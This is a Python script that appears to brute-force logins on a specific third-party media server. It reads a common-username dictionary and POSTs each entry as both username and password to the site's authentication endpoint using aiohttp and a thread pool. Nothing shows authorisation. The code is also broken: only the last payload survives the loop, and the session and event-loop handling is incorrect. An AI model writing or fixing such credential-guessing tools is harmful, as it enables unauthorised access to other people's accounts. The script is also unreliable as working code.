import asyncio
import aiohttp
from concurrent.futures import ThreadPoolExecutor


def run_async(loop, future, func, *args):
    asyncio.run_coroutine_threadsafe(func(*args), loop)
    loop.run_forever()


async def send_post_request(session, url, payload):
    async with session.post(url, json=payload) as response:
        return await response.text() if response.status == 200 else f"Failed: {response.status}"


def main():
    url = "https://video.bystart.icu/Users/authenticatebyname"  # Replace with your URL
    result = get_data_from_file('C:\\Users\\bowang28\\Desktop\\测试\\字典\\Blasting_dictionary-master\\常用用户名.txt')
    for iteam in result:
        payload = {
            "Username": iteam,
            "Pw": iteam
        }

    loop = asyncio.new_event_loop()
    executor = ThreadPoolExecutor(max_workers=20)

    with aiohttp.ClientSession() as session:
        future = loop.create_task(send_post_request(session, url, payload))
        executor.submit(run_async, loop, future, send_post_request, session, url, payload)

        result = future.result()  # Wait for the result
        print("Result:", result)

def get_data_from_file(path):
    # 定义一个空集合
    data_set = set()

    # 打开文件（假设文件名为 'example.txt'）
    with open(path, 'r', encoding='utf-8') as file:
        # 逐行读取文件内容
        for line in file:
            # 去除每行的换行符，并将内容加入集合中
            data_set.add(line.strip())
    return data_set

if __name__ == "__main__":
    main()
